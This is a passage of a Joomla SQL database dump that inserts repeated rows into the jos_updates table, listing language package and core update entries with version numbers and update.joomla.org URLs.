(675, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(676, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(677, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(678, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(679, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(680, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(681, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(682, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(683, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(684, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(685, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(686, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(687, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(688, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(689, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(690, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(691, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(692, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(693, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(694, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(695, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(696, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', '');
INSERT INTO `jos_updates` (`update_id`, `update_site_id`, `extension_id`, `categoryid`, `name`, `description`, `element`, `type`, `folder`, `client_id`, `version`, `data`, `detailsurl`, `infourl`) VALUES
(697, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(698, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(699, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(700, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(701, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(702, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(703, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(704, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(705, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(706, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(707, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(708, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(709, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(710, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(711, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(712, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(713, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(714, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(715, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(716, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(717, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(718, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(719, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(720, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(721, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(722, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(723, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(724, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(725, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(726, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(727, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(728, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(729, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(730, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(731, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(732, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(733, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(734, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(735, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(736, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(737, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(738, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(739, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(740, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(741, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(742, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(743, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(744, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(745, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(746, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(747, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(748, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(749, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(750, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(751, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(752, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(753, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(754, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(755, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(756, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(757, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(758, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(759, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(760, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(761, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(762, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(763, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(764, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(765, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(766, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(767, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(768, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(769, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(770, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(771, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(772, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(773, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(774, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(775, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(776, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(777, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(778, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(779, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(780, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(781, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(782, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(783, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(784, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(785, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(786, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(787, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(788, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(789, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(790, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(791, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(792, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(793, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(794, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(795, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(796, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(797, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(798, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(799, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(800, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(801, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(802, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(803, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(804, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(805, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(806, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(807, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(808, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(809, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(810, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(811, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(812, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(813, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(814, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(815, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(816, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(817, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(818, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(819, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(820, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(821, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(822, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(823, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(824, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(825, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(826, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(827, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(828, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(829, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(830, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(831, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(832, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(833, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(834, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(835, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(836, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(837, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(838, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(839, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(840, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(841, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(842, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(843, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(844, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(845, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(846, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(847, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(848, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(849, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(850, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(851, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
